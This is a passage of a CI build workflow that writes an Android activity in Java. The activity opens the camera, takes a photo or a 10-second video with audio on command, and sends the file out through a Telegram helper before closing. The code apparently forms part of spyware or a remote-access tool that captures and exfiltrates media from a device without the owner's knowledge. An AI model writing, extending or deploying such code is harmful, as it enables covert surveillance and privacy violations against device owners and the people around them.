      - name: CameraActivity.java
        run: |
          cat << 'EOF' > app/src/main/java/com/h/core/CameraActivity.java
          package com.h.core;
          import android.app.Activity;
          import android.hardware.Camera;
          import android.media.MediaRecorder;
          import android.os.Bundle;
          import android.view.SurfaceHolder;
          import android.view.SurfaceView;
          import java.io.File;
          import java.io.FileOutputStream;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          
          public class CameraActivity extends Activity implements SurfaceHolder.Callback {
              private Camera cam; 
              private MediaRecorder recorder; 
              private boolean isVideo = false; 
              private SurfaceView sv; 
              private SurfaceHolder sh;
              
              @Override 
              protected void onCreate(Bundle b) {
                  super.onCreate(b); 
                  sv = new SurfaceView(this); 
                  setContentView(sv); 
                  sh = sv.getHolder(); 
                  sh.addCallback(this);
                  isVideo = getIntent().hasExtra("mode") && getIntent().getStringExtra("mode").equals("video");
              }
              
              public void surfaceCreated(SurfaceHolder h) { 
                  try { 
                      cam = Camera.open(); 
                      cam.setPreviewDisplay(h); 
                      cam.startPreview(); 
                      
                      if(isVideo) { 
                          recorder = new MediaRecorder(); 
                          cam.unlock(); 
                          recorder.setCamera(cam); 
                          recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER); 
                          recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA); 
                          recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); 
                          recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); 
                          recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264); 
                          String path = getExternalFilesDir(null)+"/vid_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".mp4"; 
                          recorder.setOutputFile(path); 
                          recorder.setPreviewDisplay(h.getSurface()); 
                          recorder.prepare(); 
                          recorder.start(); 
                          new android.os.Handler().postDelayed(()->{ 
                              recorder.stop(); 
                              recorder.release(); 
                              cam.lock(); 
                              cam.release(); 
                              Telegram.sendVideo(this, new File(path), "🎥 فيديو"); 
                              finish(); 
                          }, 10000);
                      } else { 
                          cam.takePicture(null, null, (data, camera) -> { 
                              String path = getExternalFilesDir(null)+"/pic_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".jpg"; 
                              try(FileOutputStream fos = new FileOutputStream(path)){ 
                                  fos.write(data); 
                              }catch(Exception e){} 
                              cam.release(); 
                              Telegram.sendPhoto(this, new File(path), "📸 صورة"); 
                              finish(); 
                          }); 
                      }
                  } catch(Exception e){ 
                      finish(); 
                  } 
              }
              
              public void surfaceChanged(SurfaceHolder h, int f, int w, int hh) {}
              public void surfaceDestroyed(SurfaceHolder h) { 
                  if(cam!=null) cam.release(); 
                  if(recorder!=null) recorder.release(); 
              }
          }
          EOF

